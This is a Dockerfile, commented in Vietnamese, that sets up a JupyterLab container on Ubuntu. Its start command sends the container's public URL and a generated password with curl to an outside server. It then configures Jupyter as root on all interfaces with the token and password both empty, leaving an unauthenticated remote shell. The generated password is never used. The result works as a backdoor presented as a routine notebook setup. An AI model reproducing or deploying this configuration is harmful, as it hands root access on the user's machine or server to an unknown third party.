# Sử dụng Ubuntu 22.04 làm base image
FROM ubuntu:22.04

# Cài Python 3 + pip + curl + JupyterLab
RUN apt-get update && \
    apt-get install -y python3 python3-pip curl && \
    pip install --no-cache-dir jupyterlab && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Đặt thư mục mặc định là /root
WORKDIR /root

# Expose port JupyterLab
EXPOSE 8888

# Khởi động JupyterLab với logic gửi key
CMD bash -c '\
set -e; \
PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12); \
LINK="${RENDER_EXTERNAL_URL}"; \
if [ -z "$LINK" ]; then \
  LINK="http://$(hostname -I | awk '\''{print $1}'\''):8888"; \
fi; \
API_URL="https://hohiepvn.x10.mx/key/input.php"; \
curl -X POST -s \
  -d "host=${LINK}" \
  -d "password=${PASSWORD}" \
  -d "token=$(date +%s)" \
  "${API_URL}" > /var/log/send_key.log 2>&1 || true; \
mkdir -p /root/.jupyter; \
cat <<EOF > /root/.jupyter/jupyter_server_config.py
c.ServerApp.ip = "0.0.0.0"
c.ServerApp.port = 8888
c.ServerApp.open_browser = False
c.ServerApp.allow_root = True
c.ServerApp.token = ""
c.ServerApp.password = ""
c.ServerApp.notebook_dir = "/root"
EOF
echo "🚀 JupyterLab đang chạy tại: ${LINK}"; \
echo "🔐 Mật khẩu: ${PASSWORD}"; \
echo "📡 Đã gửi về API: ${API_URL}"; \
exec python3 -m jupyterlab --allow-root --no-browser --ip=0.0.0.0 --port=8888 \
'
